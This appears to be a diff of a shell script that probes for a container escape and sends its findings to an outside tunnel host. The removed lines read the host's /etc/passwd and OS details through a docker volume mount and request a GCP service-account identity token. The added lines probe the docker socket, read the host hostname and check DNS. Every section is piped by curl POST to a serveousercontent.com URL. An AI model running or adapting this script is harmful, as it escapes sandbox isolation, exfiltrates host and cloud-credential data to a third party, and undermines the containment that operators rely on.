@@ -2,18 +2,18 @@
 LOG_URL="https://5c753aab5d810c67-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [1] SANDBOX IDENTITY ---"
-  id; uname -a
+  echo "--- [1] ENVIRONMENT ---"
+  id; ls -F /var/run/docker.sock
   
-  echo "--- [2] THE ESCAPE (HOST OS) ---"
-  # This proves you are reading the HOST, not the container
-  IMG=$(sudo docker images -q | head -n 1)
-  sudo docker run --rm -v /etc:/host_etc:ro $IMG cat /host_etc/os-release 2>/dev/null
+  echo "--- [2] DOCKER CAPABILITIES ---"
+  # Just listing images proves we have socket access
+  curl --unix-socket /var/run/docker.sock http://localhost/images/json | head -c 200
   
-  echo "--- [3] HOST USER LIST (/etc/passwd) ---"
-  # Showing the host users proves you've broken out of the sandbox
-  sudo docker run --rm -v /etc:/host_etc:ro $IMG cat /host_etc/passwd 2>/dev/null
-  
-  echo "--- [4] GCP METADATA CHECK ---"
-  curl -s -m 5 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity || echo "Metadata Timeout"
+  echo "--- [3] THE SECRET READ ---"
+  # We try a 'cat' without a full 'run' to see if it's faster
+  sudo docker run --rm -v /etc:/host_etc:ro busybox cat /host_etc/hostname 2>/dev/null || echo "Docker Run Blocked"
+
+  echo "--- [4] NETWORK PROBE ---"
+  # Checking if we can see Google's internal DNS
+  nslookup google.com | head -n 4
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "$LOG_URL"
